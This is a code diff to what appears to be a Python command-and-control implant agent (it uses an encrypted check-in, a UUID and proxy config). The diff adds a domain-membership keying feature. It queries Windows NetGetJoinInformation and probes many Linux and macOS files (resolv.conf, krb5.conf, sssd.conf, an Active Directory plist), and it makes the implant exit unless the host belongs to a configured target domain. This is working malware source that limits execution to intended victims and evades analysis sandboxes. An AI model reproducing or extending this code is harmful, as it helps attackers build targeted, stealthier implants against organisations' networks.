@@ -16,7 +16,248 @@ CRYPTO_HERE
         except: pass
         for k in [ "USER", "LOGNAME", "USERNAME" ]: 
             if k in os.environ.keys(): return os.environ[k]
-
+    def isJoinedToTheProvidedDomain(self):
+        target_domain = self.agent_config["DomainCheck"]
+        try:
+            # For Windows systems, use NetGetJoinInformation for robust domain detection
+            if os.name == 'nt':
+                import ctypes
+                from ctypes import wintypes, POINTER, byref
+                
+                # NetGetJoinInformation constants
+                NetSetupUnknownStatus = 0
+                NetSetupUnjoined = 1
+                NetSetupWorkgroupName = 2
+                NetSetupDomainName = 3
+                
+                # Load netapi32.dll
+                netapi32 = ctypes.WinDLL('netapi32.dll')
+                
+                # Define NetGetJoinInformation function
+                NetGetJoinInformation = netapi32.NetGetJoinInformation
+                NetGetJoinInformation.argtypes = [
+                    wintypes.LPCWSTR,  # lpServer
+                    POINTER(wintypes.LPWSTR),  # lpNameBuffer
+                    POINTER(wintypes.DWORD)   # BufferType
+                ]
+                NetGetJoinInformation.restype = wintypes.DWORD
+                
+                # Define NetApiBufferFree
+                NetApiBufferFree = netapi32.NetApiBufferFree
+                NetApiBufferFree.argtypes = [wintypes.LPVOID]
+                NetApiBufferFree.restype = wintypes.DWORD
+                
+                # Call NetGetJoinInformation
+                name_buffer = wintypes.LPWSTR()
+                buffer_type = wintypes.DWORD()
+                
+                result = NetGetJoinInformation(
+                    None,  # Local computer
+                    byref(name_buffer),
+                    byref(buffer_type)
+                )
+                
+                if result == 0:  # NERR_Success
+                    try:
+                        # Check if system is domain-joined
+                        if buffer_type.value == NetSetupDomainName:
+                            # Get domain name
+                            domain_name = ctypes.wstring_at(name_buffer).upper()
+                            target_domain_upper = target_domain.upper()
+                            
+                            # Free the buffer
+                            NetApiBufferFree(name_buffer)
+                            
+                            # Compare domain names
+                            return domain_name == target_domain_upper
+                        else:
+                            # System is not domain-joined (workgroup or unknown)
+                            NetApiBufferFree(name_buffer)
+                            return False
+                    except:
+                        # Free buffer on error
+                        try:
+                            NetApiBufferFree(name_buffer)
+                        except:
+                            pass
+                        return False
+                else:
+                    # NetGetJoinInformation failed, fallback to environment variables
+                    pass
+            
+            # Linux/macOS domain detection methods
+            if os.name == 'posix':
+                import socket
+                target_domain_upper = target_domain.upper()
+                
+                # Method 1: Check /etc/resolv.conf for domain/search directives
+                try:
+                    with open('/etc/resolv.conf', 'r') as f:
+                        resolv_content = f.read().upper()
+                        for line in resolv_content.split('\n'):
+                            line = line.strip()
+                            if line.startswith('DOMAIN ') or line.startswith('SEARCH '):
+                                domains = line.split()[1:]
+                                for domain in domains:
+                                    if domain == target_domain_upper:
+                                        return True
+                except:
+                    pass
+                
+                # Method 2: Use socket.getfqdn() to get FQDN
+                try:
+                    fqdn = socket.getfqdn().upper()
+                    if '.' in fqdn:
+                        domain_part = '.'.join(fqdn.split('.')[1:])
+                        if domain_part == target_domain_upper:
+                            return True
+                except:
+                    pass
+                
+                # Method 3: Check /etc/hostname and /etc/hosts for domain info
+                try:
+                    with open('/etc/hostname', 'r') as f:
+                        hostname = f.read().strip().upper()
+                        if '.' in hostname:
+                            domain_part = '.'.join(hostname.split('.')[1:])
+                            if domain_part == target_domain_upper:
+                                return True
+                except:
+                    pass
+                
+                # Method 4: Parse /etc/krb5.conf for Kerberos realm (domain-joined systems)
+                try:
+                    with open('/etc/krb5.conf', 'r') as f:
+                        krb_content = f.read().upper()
+                        for line in krb_content.split('\n'):
+                            line = line.strip()
+                            if 'DEFAULT_REALM' in line and '=' in line:
+                                realm = line.split('=')[1].strip()
+                                if realm == target_domain_upper:
+                                    return True
+                except:
+                    pass
+                
+                # Method 5: Check /etc/sssd/sssd.conf for domain configuration
+                try:
+                    with open('/etc/sssd/sssd.conf', 'r') as f:
+                        sssd_content = f.read().upper()
+                        for line in sssd_content.split('\n'):
+                            line = line.strip()
+                            if line.startswith('[DOMAIN/') and line.endswith(']'):
+                                domain = line[8:-1]  # Remove [domain/ and ]
+                                if domain == target_domain_upper:
+                                    return True
+                except:
+                    pass
+                
+                # Method 6: Check systemd-resolved configuration files
+                try:
+                    # Check systemd-resolved main config
+                    with open('/etc/systemd/resolved.conf', 'r') as f:
+                        resolved_content = f.read().upper()
+                        for line in resolved_content.split('\n'):
+                            line = line.strip()
+                            if line.startswith('DOMAINS='):
+                                domains = line.split('=')[1].split()
+                                for domain in domains:
+                                    if domain == target_domain_upper:
+                                        return True
+                except:
+                    pass
+                
+                # Method 7: Check /etc/dhcp/dhclient.conf for domain settings
+                try:
+                    with open('/etc/dhcp/dhclient.conf', 'r') as f:
+                        dhcp_content = f.read().upper()
+                        for line in dhcp_content.split('\n'):
+                            line = line.strip()
+                            if 'DOMAIN-NAME' in line and '"' in line:
+                                # Extract domain from quoted string
+                                parts = line.split('"')
+                                if len(parts) >= 2:
+                                    domain = parts[1].strip()
+                                    if domain == target_domain_upper:
+                                        return True
+                except:
+                    pass
+                
+                # Method 8: macOS specific - check system configuration files
+                if platform.system().upper() == 'DARWIN':
+                    try:
+                        # Check /etc/resolv.conf alternatives on macOS
+                        with open('/var/run/resolv.conf', 'r') as f:
+                            resolv_content = f.read().upper()
+                            for line in resolv_content.split('\n'):
+                                line = line.strip()
+                                if line.startswith('DOMAIN ') or line.startswith('SEARCH '):
+                                    domains = line.split()[1:]
+                                    for domain in domains:
+                                        if domain == target_domain_upper:
+                                            return True
+                    except:
+                        pass
+                    
+                    # Check macOS Directory Services configuration
+                    try:
+                        import plistlib
+                        with open('/Library/Preferences/OpenDirectory/Configurations/Active Directory.plist', 'rb') as f:
+                            plist_data = plistlib.load(f)
+                            if 'domain name' in plist_data:
+                                ad_domain = plist_data['domain name'].upper()
+                                if ad_domain == target_domain_upper:
+                                    return True
+                    except:
+                        pass
+                
+                # Method 9: Check network interface configuration files
+                try:
+                    import glob
+                    # Check various network config locations
+                    config_paths = [
+                        '/etc/sysconfig/network-scripts/ifcfg-*',
+                        '/etc/network/interfaces',
+                        '/etc/netplan/*.yaml',
+                        '/etc/netplan/*.yml'
+                    ]
+                    
+                    for pattern in config_paths:
+                        for config_file in glob.glob(pattern):
+                            try:
+                                with open(config_file, 'r') as f:
+                                    content = f.read().upper()
+                                    for line in content.split('\n'):
+                                        line = line.strip()
+                                        if any(keyword in line for keyword in ['DOMAIN', 'SEARCH_DOMAIN', 'DNS_DOMAIN']):
+                                            if '=' in line:
+                                                domain = line.split('=')[1].strip().strip('"\'')
+                                                if domain == target_domain_upper:
+                                                    return True
+                            except:
+                                continue
+                except:
+                    pass
+                
+                return False
+            
+            # Fallback method using environment variables (Windows)
+            current_domain = os.environ.get('USERDOMAIN', '').upper()
+            target_domain_upper = target_domain.upper()
+            
+            # Check if current domain matches target domain
+            if current_domain == target_domain_upper:
+                return True
+                
+            # Additional check using USERDNSDOMAIN for FQDN
+            dns_domain = os.environ.get('USERDNSDOMAIN', '').upper()
+            if dns_domain == target_domain_upper:
+                return True
+                
+            return False
+        except Exception:
+            # If any error occurs, assume not joined to target domain
+            return False
+      
     def formatMessage(self, data, urlsafe=False):
         output = base64.b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
         if urlsafe: 
@@ -216,8 +457,11 @@ CRYPTO_HERE
             "ProxyUser": "proxy_user",
             "ProxyPass": "proxy_pass",
             "ProxyPort": "proxy_port",
+            "DomainCheck": "#DOMAIN_CHECK_HERE",
         }
-
+        if self.agent_config["DomainCheck"] != "":
+            if not self.isJoinedToTheProvidedDomain():
+                os._exit(0)
         while(True):
             if(self.agent_config["UUID"] == ""):
                 self.checkIn()
